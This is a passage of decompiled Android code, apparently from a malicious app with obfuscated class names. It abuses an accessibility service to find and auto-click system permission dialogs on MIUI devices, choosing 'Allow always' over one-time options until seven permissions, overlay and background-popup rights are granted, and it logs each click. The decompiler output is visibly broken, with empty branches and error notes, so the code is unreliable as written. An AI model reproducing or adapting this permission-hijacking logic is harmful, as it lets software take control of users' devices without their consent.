                miuiSteps$executeBackgroundPopupFlow$15.f54363b9 = 20;
                it4 = it3;
                int i852 = i40;
                if (b81.m210571b1(200L, miuiSteps$executeBackgroundPopupFlow$15) != coroutineSingletons2) {
                }
                return coroutineSingletons2;
            case 20:
                int i123 = miuiSteps$executeBackgroundPopupFlow$1.f54358b4;
                int i124 = miuiSteps$executeBackgroundPopupFlow$1.f54357b3;
                int i125 = miuiSteps$executeBackgroundPopupFlow$1.f54356b2;
                int i126 = miuiSteps$executeBackgroundPopupFlow$1.f54355b1;
                int i127 = miuiSteps$executeBackgroundPopupFlow$1.f54354b0;
                int i128 = miuiSteps$executeBackgroundPopupFlow$1.f54353a9;
                i38 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                i39 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                str13 = miuiSteps$executeBackgroundPopupFlow$1.f54348a4;
                Iterator it24 = (Iterator) miuiSteps$executeBackgroundPopupFlow$1.f54347a3;
                linkedHashSet3 = (Set) miuiSteps$executeBackgroundPopupFlow$1.f54346a2;
                map2 = (Map) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                c0367a414 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                str12 = "│ │ │ │ ✅ 全部7个权限已完成!";
                str7 = "/";
                str14 = ")";
                i41 = i123;
                it4 = it24;
                i42 = i127;
                i29 = i128;
                str11 = "│ │ │ │";
                miuiSteps$executeBackgroundPopupFlow$15 = miuiSteps$executeBackgroundPopupFlow$1;
                i43 = i126;
                i44 = i125;
                i45 = i124;
                coroutineSingletons2 = coroutineSingletons5;
                int i862 = i44;
                C0367a4 c0367a4242 = c0367a414;
                it11 = AbstractC0716jf.m213306g5("始终允许", "Allow always", "允许", "Allow", "仅在使用时允许", "While using the app").iterator();
                i71 = i42;
                int i872 = i862;
                Map map72 = map2;
                CoroutineSingletons coroutineSingletons92 = coroutineSingletons2;
                Map map82 = map72;
                str8 = str14;
                str20 = str13;
                it7 = it4;
                LinkedHashSet linkedHashSet102 = linkedHashSet3;
                int i882 = i41;
                int i892 = i39;
                int i902 = i29;
                int i912 = i38;
                int i922 = i43;
                int i932 = i45;
                i73 = 0;
                if (it11.hasNext()) {
                }
                break;
            case 21:
                obj6 = obj7;
                int i129 = miuiSteps$executeBackgroundPopupFlow$1.f54359b5;
                int i130 = miuiSteps$executeBackgroundPopupFlow$1.f54358b4;
                int i131 = miuiSteps$executeBackgroundPopupFlow$1.f54357b3;
                int i132 = miuiSteps$executeBackgroundPopupFlow$1.f54356b2;
                int i133 = miuiSteps$executeBackgroundPopupFlow$1.f54355b1;
                int i134 = miuiSteps$executeBackgroundPopupFlow$1.f54354b0;
                int i135 = miuiSteps$executeBackgroundPopupFlow$1.f54353a9;
                i46 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                i47 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                String str31 = miuiSteps$executeBackgroundPopupFlow$1.f54350a6;
                Iterator it25 = miuiSteps$executeBackgroundPopupFlow$1.f54349a5;
                String str32 = miuiSteps$executeBackgroundPopupFlow$1.f54348a4;
                Iterator it26 = (Iterator) miuiSteps$executeBackgroundPopupFlow$1.f54347a3;
                ?? r03 = (Set) miuiSteps$executeBackgroundPopupFlow$1.f54346a2;
                Map map16 = (Map) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                C0367a4 c0367a435 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj6);
                i48 = i132;
                map3 = map16;
                str8 = ")";
                i49 = i135;
                coroutineSingletons3 = coroutineSingletons5;
                str7 = "/";
                str15 = str32;
                i50 = i134;
                i51 = i131;
                str16 = str31;
                it5 = it25;
                i52 = i129;
                str11 = "│ │ │ │";
                i53 = i133;
                c0367a415 = c0367a435;
                i54 = i130;
                it6 = it26;
                str12 = "│ │ │ │ ✅ 全部7个权限已完成!";
                miuiSteps$executeBackgroundPopupFlow$16 = miuiSteps$executeBackgroundPopupFlow$1;
                linkedHashSet4 = r03;
                if (((Boolean) obj6).booleanValue()) {
                }
                break;
            case 22:
                int i136 = miuiSteps$executeBackgroundPopupFlow$1.f54359b5;
                int i137 = miuiSteps$executeBackgroundPopupFlow$1.f54358b4;
                i55 = miuiSteps$executeBackgroundPopupFlow$1.f54357b3;
                int i138 = miuiSteps$executeBackgroundPopupFlow$1.f54356b2;
                i56 = miuiSteps$executeBackgroundPopupFlow$1.f54355b1;
                i57 = miuiSteps$executeBackgroundPopupFlow$1.f54354b0;
                int i139 = miuiSteps$executeBackgroundPopupFlow$1.f54353a9;
                i46 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                i47 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                String str33 = miuiSteps$executeBackgroundPopupFlow$1.f54348a4;
                Iterator it27 = (Iterator) miuiSteps$executeBackgroundPopupFlow$1.f54347a3;
                linkedHashSet5 = (Set) miuiSteps$executeBackgroundPopupFlow$1.f54346a2;
                Map map17 = (Map) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                c0367a416 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                coroutineSingletons4 = coroutineSingletons5;
                i58 = i137;
                str7 = "/";
                str8 = ")";
                str15 = str33;
                it6 = it27;
                i49 = i139;
                i48 = i138;
                map3 = map17;
                str12 = "│ │ │ │ ✅ 全部7个权限已完成!";
                i59 = i136;
                str11 = "│ │ │ │";
                int i972 = i46;
                map4 = map3;
                i63 = i972;
                i71 = i57;
                i70 = i48;
                linkedHashSet9 = linkedHashSet5;
                miuiSteps$executeBackgroundPopupFlow$15 = miuiSteps$executeBackgroundPopupFlow$1;
                str20 = str15;
                it7 = it6;
                i61 = i55;
                i73 = i59;
                i72 = i56;
                i64 = i47;
                c0367a417 = c0367a416;
                i60 = i58;
                if (i73 == 0) {
                }
                linkedHashSet9.add(str20);
                int i9622 = i72;
                i68 = i71;
                c0367a417.m212274d8("│ │ │ │   📊 权限组完成: " + str20 + " (已完成: " + linkedHashSet9.size() + "/6)");
                if (linkedHashSet9.size() >= 7) {
                }
                break;
            case 23:
                i60 = miuiSteps$executeBackgroundPopupFlow$1.f54355b1;
                i61 = miuiSteps$executeBackgroundPopupFlow$1.f54354b0;
                i62 = miuiSteps$executeBackgroundPopupFlow$1.f54353a9;
                i63 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                i64 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                Iterator it28 = (Iterator) miuiSteps$executeBackgroundPopupFlow$1.f54347a3;
                ?? r10 = (Set) miuiSteps$executeBackgroundPopupFlow$1.f54346a2;
                map4 = (Map) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                c0367a417 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                coroutineSingletons4 = coroutineSingletons5;
                it7 = it28;
                str11 = "│ │ │ │";
                str7 = "/";
                str8 = ")";
                miuiSteps$executeBackgroundPopupFlow$15 = miuiSteps$executeBackgroundPopupFlow$1;
                str17 = "│ │ │ │ ✅ 全部7个权限已完成!";
                linkedHashSet8 = r10;
                miuiSteps$executeBackgroundPopupFlow$17 = miuiSteps$executeBackgroundPopupFlow$15;
                Map map1222 = map4;
                c0367a419 = c0367a417;
                LinkedHashSet linkedHashSet1522 = linkedHashSet8;
                miuiSteps$executeBackgroundPopupFlow$17.f54344a0 = c0367a419;
                miuiSteps$executeBackgroundPopupFlow$17.f54345a1 = map1222;
                miuiSteps$executeBackgroundPopupFlow$17.f54346a2 = linkedHashSet1522;
                miuiSteps$executeBackgroundPopupFlow$17.f54347a3 = it7;
                miuiSteps$executeBackgroundPopupFlow$17.f54351a7 = i64;
                miuiSteps$executeBackgroundPopupFlow$17.f54352a8 = i63;
                miuiSteps$executeBackgroundPopupFlow$17.f54353a9 = i62;
                miuiSteps$executeBackgroundPopupFlow$17.f54354b0 = i61;
                miuiSteps$executeBackgroundPopupFlow$17.f54355b1 = i60;
                miuiSteps$executeBackgroundPopupFlow$17.f54363b9 = 25;
                if (c0367a419.m212294f9(2, 100L, 500L, miuiSteps$executeBackgroundPopupFlow$17) != coroutineSingletons4) {
                }
                break;
            case 24:
                i60 = miuiSteps$executeBackgroundPopupFlow$1.f54355b1;
                i61 = miuiSteps$executeBackgroundPopupFlow$1.f54354b0;
                i62 = miuiSteps$executeBackgroundPopupFlow$1.f54353a9;
                i63 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                i64 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                Iterator it29 = (Iterator) miuiSteps$executeBackgroundPopupFlow$1.f54347a3;
                ?? r102 = (Set) miuiSteps$executeBackgroundPopupFlow$1.f54346a2;
                map4 = (Map) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                c0367a417 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                coroutineSingletons4 = coroutineSingletons5;
                it7 = it29;
                str11 = "│ │ │ │";
                str7 = "/";
                str8 = ")";
                miuiSteps$executeBackgroundPopupFlow$15 = miuiSteps$executeBackgroundPopupFlow$1;
                str17 = "│ │ │ │ ✅ 全部7个权限已完成!";
                linkedHashSet6 = r102;
                rootInActiveWindow2 = c0367a417.f55106a0.getRootInActiveWindow();
                if (rootInActiveWindow2 == null) {
                }
                if (z2) {
                }
                it7 = it9;
                linkedHashSet8 = linkedHashSet6;
                miuiSteps$executeBackgroundPopupFlow$17 = miuiSteps$executeBackgroundPopupFlow$15;
                Map map12222 = map4;
                c0367a419 = c0367a417;
                LinkedHashSet linkedHashSet15222 = linkedHashSet8;
                miuiSteps$executeBackgroundPopupFlow$17.f54344a0 = c0367a419;
                miuiSteps$executeBackgroundPopupFlow$17.f54345a1 = map12222;
                miuiSteps$executeBackgroundPopupFlow$17.f54346a2 = linkedHashSet15222;
                miuiSteps$executeBackgroundPopupFlow$17.f54347a3 = it7;
                miuiSteps$executeBackgroundPopupFlow$17.f54351a7 = i64;
                miuiSteps$executeBackgroundPopupFlow$17.f54352a8 = i63;
                miuiSteps$executeBackgroundPopupFlow$17.f54353a9 = i62;
                miuiSteps$executeBackgroundPopupFlow$17.f54354b0 = i61;
                miuiSteps$executeBackgroundPopupFlow$17.f54355b1 = i60;
                miuiSteps$executeBackgroundPopupFlow$17.f54363b9 = 25;
                if (c0367a419.m212294f9(2, 100L, 500L, miuiSteps$executeBackgroundPopupFlow$17) != coroutineSingletons4) {
                }
                break;
            case 25:
                i60 = miuiSteps$executeBackgroundPopupFlow$1.f54355b1;
                i61 = miuiSteps$executeBackgroundPopupFlow$1.f54354b0;
                i62 = miuiSteps$executeBackgroundPopupFlow$1.f54353a9;
                i63 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                i64 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                it8 = (Iterator) miuiSteps$executeBackgroundPopupFlow$1.f54347a3;
                ?? r103 = (Set) miuiSteps$executeBackgroundPopupFlow$1.f54346a2;
                map4 = (Map) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                c0367a418 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                coroutineSingletons4 = coroutineSingletons5;
                str11 = "│ │ │ │";
                str7 = "/";
                str8 = ")";
                miuiSteps$executeBackgroundPopupFlow$17 = miuiSteps$executeBackgroundPopupFlow$1;
                str17 = "│ │ │ │ ✅ 全部7个权限已完成!";
                linkedHashSet7 = r103;
                C0367a4 c0367a4262 = c0367a418;
                i66 = i61;
                c0367a411 = c0367a4262;
                MiuiSteps$executeBackgroundPopupFlow$1 miuiSteps$executeBackgroundPopupFlow$182 = miuiSteps$executeBackgroundPopupFlow$17;
                it10 = it8;
                miuiSteps$executeBackgroundPopupFlow$15 = miuiSteps$executeBackgroundPopupFlow$182;
                i26 = i62;
                i67 = i63;
                linkedHashSet = linkedHashSet7;
                i23 = 0;
                i68 = 0;
                i69 = 1;
                i34 = i60;
                i21 = i64;
                if (i34 == 0) {
                }
                break;
            case 26:
                int i140 = miuiSteps$executeBackgroundPopupFlow$1.f54356b2;
                int i141 = miuiSteps$executeBackgroundPopupFlow$1.f54355b1;
                int i142 = miuiSteps$executeBackgroundPopupFlow$1.f54354b0;
                int i143 = miuiSteps$executeBackgroundPopupFlow$1.f54353a9;
                int i144 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                int i145 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                ?? r104 = (Set) miuiSteps$executeBackgroundPopupFlow$1.f54346a2;
                Map map18 = (Map) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                C0367a4 c0367a436 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                coroutineSingletons4 = coroutineSingletons5;
                i26 = i143;
                str11 = "│ │ │ │";
                map5 = map18;
                i24 = i140;
                i23 = i141;
                i25 = i144;
                i21 = i145;
                c0367a411 = c0367a436;
                miuiSteps$executeBackgroundPopupFlow$15 = miuiSteps$executeBackgroundPopupFlow$1;
                i65 = i142;
                str17 = "│ │ │ │ ✅ 全部7个权限已完成!";
                linkedHashSet = r104;
                str18 = ")";
                Map map112 = map5;
                coroutineSingletons5 = coroutineSingletons4;
                mapM213614f9 = map112;
                str = str17;
                miuiSteps$executeBackgroundPopupFlow$1 = miuiSteps$executeBackgroundPopupFlow$15;
                str5 = str22;
                str6 = str18;
                i22 = i65;
                str2 = str11;
                if (linkedHashSet.size() >= 7) {
                }
                break;
            case 27:
                int i146 = miuiSteps$executeBackgroundPopupFlow$1.f54356b2;
                int i147 = miuiSteps$executeBackgroundPopupFlow$1.f54355b1;
                int i148 = miuiSteps$executeBackgroundPopupFlow$1.f54354b0;
                int i149 = miuiSteps$executeBackgroundPopupFlow$1.f54353a9;
                int i150 = miuiSteps$executeBackgroundPopupFlow$1.f54352a8;
                int i151 = miuiSteps$executeBackgroundPopupFlow$1.f54351a7;
                ?? r105 = (Set) miuiSteps$executeBackgroundPopupFlow$1.f54346a2;
                Map map19 = (Map) miuiSteps$executeBackgroundPopupFlow$1.f54345a1;
                C0367a4 c0367a437 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                coroutineSingletons4 = coroutineSingletons5;
                i26 = i149;
                map5 = map19;
                linkedHashSet = r105;
                str11 = "│ │ │ │";
                miuiSteps$executeBackgroundPopupFlow$15 = miuiSteps$executeBackgroundPopupFlow$1;
                i23 = i147;
                str17 = "│ │ │ │ ✅ 全部7个权限已完成!";
                i65 = i148;
                i25 = i150;
                i24 = i146;
                c0367a411 = c0367a437;
                i21 = i151;
                str18 = ")";
                Map map1122 = map5;
                coroutineSingletons5 = coroutineSingletons4;
                mapM213614f9 = map1122;
                str = str17;
                miuiSteps$executeBackgroundPopupFlow$1 = miuiSteps$executeBackgroundPopupFlow$15;
                str5 = str22;
                str6 = str18;
                i22 = i65;
                str2 = str11;
                if (linkedHashSet.size() >= 7) {
                }
                break;
            case 28:
                c0367a420 = miuiSteps$executeBackgroundPopupFlow$1.f54344a0;
                kg1.m213544f4(obj7);
                str19 = "│ │ │ │";
                c0367a420.f55109a3.m214207a9(MiuiSteps$FlowType.BACKGROUND_POPUP);
                c0367a420.f55109a3.m214207a9(MiuiSteps$FlowType.OVERLAY_PERMISSION);
                c0367a420.m212274d8(str19);
                c0367a420.m212274d8("│ │ │ │ ✅ 权限管理设置完成");
                c0367a420.m212274d8("│ │ │ └─────────────────────────────────────────");
                return t60.m214689a7(true);
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Can't wrap try/catch for region: R(15:0|2|(2:4|(1:6)(1:7))(0)|8|(1:(1:(1:(10:13|117|(1:120)(5:26|(1:28)(8:30|139|31|32|(2:33|(5:35|141|36|(3:41|(8:44|(1:54)(1:51)|55|(1:152)(2:57|(5:154|61|(1:66)(1:65)|(1:68)|(2:147|70)(3:72|157|155))(2:153|59))|60|156|155|42)|151)|73)(1:148))|71|(3:101|(1:104)|116)(2:105|(2:109|(1:113)(1:112))(1:108))|114)|29|(0)(0)|114)|145|121|(1:123)(1:124)|(1:128)|129|133|134)(2:14|15))(2:16|114))(1:17))(6:18|143|19|20|(1:23)|116)|24|(0)(0)|145|121|(0)(0)|(2:126|128)|129|133|134|(1:(0))) */
    /* JADX WARN: Code restructure failed: missing block: B:115:0x0264, code lost:
    
        if (p000.b81.m210571b1(50, r4) == r5) goto L116;
     */
    /* JADX WARN: Code restructure failed: missing block: B:131:0x0295, code lost:
    
        r0 = move-exception;
     */
    /* JADX WARN: Code restructure failed: missing block: B:132:0x0296, code lost:
    
        p000.AbstractC0003a2.m45c6("│ [基础权限] ⚠️ 停止全局权限自动点击失败: ", r0.getMessage(), r15);
     */
    /* JADX WARN: Code restructure failed: missing block: B:74:0x0185, code lost:
    
        r18 = r0;
        r17 = r2;
     */
    /* JADX WARN: Code restructure failed: missing block: B:75:0x018b, code lost:
    
        r0 = r14.findAccessibilityNodeInfosByText("本次运行允许");
     */
    /* JADX WARN: Code restructure failed: missing block: B:76:0x018f, code lost:
    
        if (r0 == null) goto L81;
     */
    /* JADX WARN: Code restructure failed: missing block: B:78:0x0195, code lost:
    
        if (r0.isEmpty() == false) goto L80;
     */
    /* JADX WARN: Code restructure failed: missing block: B:80:0x0198, code lost:
    
        r2 = false;
     */
    /* JADX WARN: Code restructure failed: missing block: B:81:0x019a, code lost:
    
        r2 = r24;
     */
    /* JADX WARN: Code restructure failed: missing block: B:82:0x019c, code lost:
    
        if (r2 != false) goto L99;
     */
    /* JADX WARN: Code restructure failed: missing block: B:83:0x019e, code lost:
    
        r0 = r0.iterator();
     */
    /* JADX WARN: Code restructure failed: missing block: B:85:0x01a6, code lost:
    
        if (r0.hasNext() == false) goto L158;
     */
    /* JADX WARN: Code restructure failed: missing block: B:86:0x01a8, code lost:
    
        r2 = r0.next();
        r7 = r2.getText();
     */
    /* JADX WARN: Code restructure failed: missing block: B:87:0x01b2, code lost:
    
        if (r7 == null) goto L92;
     */
    /* JADX WARN: Code restructure failed: missing block: B:88:0x01b4, code lost:
    
        r7 = r7.toString();
     */
    /* JADX WARN: Code restructure failed: missing block: B:89:0x01b8, code lost:
    
        if (r7 == null) goto L92;
     */
    /* JADX WARN: Code restructure failed: missing block: B:90:0x01ba, code lost:
    
        r7 = kotlin.text.AbstractC0779a1.m213687e0(r7).toString();
     */
    /* JADX WARN: Code restructure failed: missing block: B:91:0x01c2, code lost:
    
        if (r7 != null) goto L93;
     */
    /* JADX WARN: Code restructure failed: missing block: B:92:0x01c4, code lost:
    
        r7 = "";
     */
    /* JADX WARN: Code restructure failed: missing block: B:94:0x01ca, code lost:
    
        if (r7.equals("本次运行允许") == false) goto L162;
     */
    /* JADX WARN: Code restructure failed: missing block: B:96:0x01d2, code lost:
    
        if (r2.performAction(16) == false) goto L163;
     */
    /* JADX WARN: Code restructure failed: missing block: B:97:0x01d4, code lost:
    
        r15.m212274d8("│ [基础权限] ✅ 点击 (备用): " + r7);
     */
    /* JADX WARN: Code restructure failed: missing block: B:99:0x01ea, code lost:
    
        r14.recycle();
     */
    /* JADX WARN: Removed duplicated region for block: B:101:0x01f1  */
    /* JADX WARN: Removed duplicated region for block: B:105:0x0222  */
    /* JADX WARN: Removed duplicated region for block: B:120:0x0277  */
    /* JADX WARN: Removed duplicated region for block: B:123:0x027d  */
    /* JADX WARN: Removed duplicated region for block: B:124:0x027e  */
    /* JADX WARN: Removed duplicated region for block: B:26:0x00a5  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001b  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:115:0x0264 -> B:117:0x0267). Please report as a decompilation issue!!! */
    /* renamed from: b6 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212257b6(ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$executeBasicPermissions$1 miuiSteps$executeBasicPermissions$1;
        C0367a4 c0367a4;
        int i;
        C0367a4 c0367a42;
        int i2;
        int i3;
        int i4;
        boolean z;
        C1351vv c1351vv;
        int i5;
        int i6;
        char c;
        char c2;
        dqtvuisjd dqtvuisjdVar;
        C0260a2 c0260a2;
        int i7;
        boolean z2;
        String str;
        String str2;
        AccessibilityNodeInfo parent;
        String string;
        String string2;
        C1351vv c1351vv2 = C1351vv.f60710b1;
        dqtvuisjd dqtvuisjdVar2 = this.f55106a0;
        if (continuationImpl instanceof MiuiSteps$executeBasicPermissions$1) {
            miuiSteps$executeBasicPermissions$1 = (MiuiSteps$executeBasicPermissions$1) continuationImpl;
            int i8 = miuiSteps$executeBasicPermissions$1.f54371a7;
            if ((i8 & Integer.MIN_VALUE) != 0) {
                miuiSteps$executeBasicPermissions$1.f54371a7 = i8 - Integer.MIN_VALUE;
            } else {
                miuiSteps$executeBasicPermissions$1 = new MiuiSteps$executeBasicPermissions$1(this, continuationImpl);
            }
        }
        Object obj = miuiSteps$executeBasicPermissions$1.f54369a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i9 = miuiSteps$executeBasicPermissions$1.f54371a7;
        boolean z3 = true;
        if (i9 == 0) {
            kg1.m213544f4(obj);
            m212274d8("│ [基础权限] ★★★ 开始执行 ★★★");
            m212274d8("│ [基础权限] 启动 umrkmgrri...");
            try {
                Intent intent = new Intent(dqtvuisjdVar2, (Class<?>) umrkmgrri.class);
                intent.setFlags(276824064);
                dqtvuisjdVar2.startActivity(intent);
                m212274d8("│ [基础权限] ✅ umrkmgrri 已启动");
                miuiSteps$executeBasicPermissions$1.f54364a0 = this;
                miuiSteps$executeBasicPermissions$1.f54371a7 = 1;
                if (b81.m210571b1(150L, miuiSteps$executeBasicPermissions$1) != coroutineSingletons) {
                    c0367a4 = this;
                }
                return coroutineSingletons;
            } catch (Exception e) {
                AbstractC0003a2.m45c6("│ [基础权限] ❌ 启动失败: ", e.getMessage(), this);
                return c1351vv2;
            }
        }
        if (i9 == 1) {
            c0367a4 = miuiSteps$executeBasicPermissions$1.f54364a0;
            kg1.m213544f4(obj);
        } else {
            if (i9 != 2) {
                if (i9 != 3) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                i3 = miuiSteps$executeBasicPermissions$1.f54368a4;
                i = miuiSteps$executeBasicPermissions$1.f54367a3;
                i6 = miuiSteps$executeBasicPermissions$1.f54366a2;
                i5 = miuiSteps$executeBasicPermissions$1.f54365a1;
                c0367a42 = miuiSteps$executeBasicPermissions$1.f54364a0;
                kg1.m213544f4(obj);
                c1351vv = c1351vv2;
                c2 = 3;
                c = 2;
                z = true;
                i3++;
                z3 = z;
                i2 = i6;
                i4 = i5;
                c1351vv2 = c1351vv;
                if (i3 >= i) {
                    c1351vv = c1351vv2;
                } else {
                    AccessibilityNodeInfo rootInActiveWindow = c0367a42.f55106a0.getRootInActiveWindow();
                    if (rootInActiveWindow == null) {
                        i7 = i2;
                        c1351vv = c1351vv2;
                        z = z3;
                    } else {
                        z = z3;
                        try {
                            String[] strArr = c0367a42.f55110a4;
                            int length = strArr.length;
                            int i10 = 0;
                            loop0: while (true) {
                                String str3 = "";
                                if (i10 >= length) {
                                    break;
                                }
                                String str4 = strArr[i10];
                                try {
                                    List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str4);
                                    if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                                        for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
                                            i7 = i2;
                                            CharSequence text = accessibilityNodeInfo.getText();
                                            if (text == null || (string = text.toString()) == null || (string2 = AbstractC0779a1.m213687e0(string).toString()) == null) {
                                                c1351vv = c1351vv2;
                                                str = str3;
                                            } else {
                                                c1351vv = c1351vv2;
                                                str = string2;
                                            }
                                            int i11 = i10;
                                            if (str.equals(AbstractC0779a1.m213687e0(str4).toString())) {
                                                if (str.equals("本次运行允许")) {
                                                    c0367a42.m212274d8("│ [基础权限] ⏭️ 跳过「本次运行允许」，寻找更好选项");
                                                } else {
                                                    boolean zPerformAction = accessibilityNodeInfo.performAction(16);
                                                    if (zPerformAction || (parent = accessibilityNodeInfo.getParent()) == null) {
                                                        str2 = str3;
                                                    } else {
                                                        str2 = str3;
                                                        zPerformAction = parent.performAction(16);
                                                        parent.recycle();
                                                    }
                                                    if (!zPerformAction) {
                                                        zPerformAction = accessibilityNodeInfo.performAction(4);
                                                    }
                                                    if (zPerformAction) {
                                                        c0367a42.m212274d8("│ [基础权限] ✅ 点击: " + str);
                                                        break loop0;
                                                    }
                                                    c1351vv2 = c1351vv;
                                                    i2 = i7;
                                                    i10 = i11;
                                                    str3 = str2;
                                                }
                                            }
                                            c1351vv2 = c1351vv;
                                            i2 = i7;
                                            i10 = i11;
                                        }
                                    }
                                } catch (Exception unused) {
                                }
                                i10++;
                                c1351vv2 = c1351vv2;
                                i2 = i2;
                            }
                            rootInActiveWindow.recycle();
                            z2 = z;
                            if (!z2) {
                                i5 = i4 + 1;
                                c0367a42.m212274d8("│ [基础权限] ✅ 第" + i5 + "次点击");
                                miuiSteps$executeBasicPermissions$1.f54364a0 = c0367a42;
                                miuiSteps$executeBasicPermissions$1.f54365a1 = i5;
                                miuiSteps$executeBasicPermissions$1.f54366a2 = 0;
                                miuiSteps$executeBasicPermissions$1.f54367a3 = i;
                                miuiSteps$executeBasicPermissions$1.f54368a4 = i3;
                                c = 2;
                                miuiSteps$executeBasicPermissions$1.f54371a7 = 2;
                                if (b81.m210571b1(50L, miuiSteps$executeBasicPermissions$1) != coroutineSingletons) {
                                    i6 = 0;
                                }
                                return coroutineSingletons;
                            }
                            c = 2;
                            int i12 = i7 + 1;
                            if (i12 >= 20 && i4 > 0) {
                                c0367a42.m212274d8("│ [基础权限] ✅ 权限完成，共点击 " + i4 + " 次");
                            } else if (i12 < 30 || i4 != 0) {
                                i5 = i4;
                                i6 = i12;
                            } else {
                                c0367a42.m212274d8("│ [基础权限] ⚠️ 未检测到权限弹窗，跳过");
                            }
                            miuiSteps$executeBasicPermissions$1.f54364a0 = c0367a42;
                            miuiSteps$executeBasicPermissions$1.f54365a1 = i5;
                            miuiSteps$executeBasicPermissions$1.f54366a2 = i6;
                            miuiSteps$executeBasicPermissions$1.f54367a3 = i;
                            miuiSteps$executeBasicPermissions$1.f54368a4 = i3;
                            c2 = 3;
                            miuiSteps$executeBasicPermissions$1.f54371a7 = 3;
                        } catch (Throwable th) {
                            rootInActiveWindow.recycle();
                            throw th;
                        }
                    }
                    z2 = false;
                    if (!z2) {
                    }
                    miuiSteps$executeBasicPermissions$1.f54364a0 = c0367a42;
                    miuiSteps$executeBasicPermissions$1.f54365a1 = i5;
                    miuiSteps$executeBasicPermissions$1.f54366a2 = i6;
                    miuiSteps$executeBasicPermissions$1.f54367a3 = i;
                    miuiSteps$executeBasicPermissions$1.f54368a4 = i3;
                    c2 = 3;
                    miuiSteps$executeBasicPermissions$1.f54371a7 = 3;
                }
                dqtvuisjdVar = c0367a42.f55106a0;
                if (dqtvuisjdVar != null) {
                    dqtvuisjdVar = null;
                }
                if (dqtvuisjdVar != null && (c0260a2 = dqtvuisjdVar.f52369a0) != null) {
                    c0260a2.m211329h2();
                    t60.m214714d6("dqtvuisjd", "✅ [授权] 已停止PermissionGranter自动点击功能");
                }
                c0367a42.m212274d8("│ [基础权限] ✅ 已停止全局权限自动点击");
                c0367a42.m212274d8("│ [基础权限] ★★★ 基础权限流程完成 ★★★");
                return c1351vv;
            }
            i3 = miuiSteps$executeBasicPermissions$1.f54368a4;
            i = miuiSteps$executeBasicPermissions$1.f54367a3;
            i6 = miuiSteps$executeBasicPermissions$1.f54366a2;
            i5 = miuiSteps$executeBasicPermissions$1.f54365a1;
            c0367a42 = miuiSteps$executeBasicPermissions$1.f54364a0;
            kg1.m213544f4(obj);
            c1351vv = c1351vv2;
            c = 2;
            z = true;
            miuiSteps$executeBasicPermissions$1.f54364a0 = c0367a42;
            miuiSteps$executeBasicPermissions$1.f54365a1 = i5;
            miuiSteps$executeBasicPermissions$1.f54366a2 = i6;
            miuiSteps$executeBasicPermissions$1.f54367a3 = i;
            miuiSteps$executeBasicPermissions$1.f54368a4 = i3;
            c2 = 3;
            miuiSteps$executeBasicPermissions$1.f54371a7 = 3;
        }
        i = 100;
        c0367a42 = c0367a4;
        i2 = 0;
        i3 = 0;
        i4 = 0;
        if (i3 >= i) {
        }
        dqtvuisjdVar = c0367a42.f55106a0;
        if (dqtvuisjdVar != null) {
        }
        if (dqtvuisjdVar != null) {
            c0260a2.m211329h2();
            t60.m214714d6("dqtvuisjd", "✅ [授权] 已停止PermissionGranter自动点击功能");
        }
        c0367a42.m212274d8("│ [基础权限] ✅ 已停止全局权限自动点击");
        c0367a42.m212274d8("│ [基础权限] ★★★ 基础权限流程完成 ★★★");
        return c1351vv;
    }

    /*  JADX ERROR: Type inference failed
        jadx.core.utils.exceptions.JadxOverflowException: Type inference error: updates count limit reached
        	at jadx.core.utils.ErrorsCounter.addError(ErrorsCounter.java:59)
        	at jadx.core.utils.ErrorsCounter.error(ErrorsCounter.java:31)
        	at jadx.core.dex.attributes.nodes.NotificationAttrNode.addError(NotificationAttrNode.java:19)
        	at jadx.core.dex.visitors.typeinference.TypeInferenceVisitor.visit(TypeInferenceVisitor.java:77)
        */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:312:0x14c2 -> B:295:0x1435). Please report as a decompilation issue!!! */
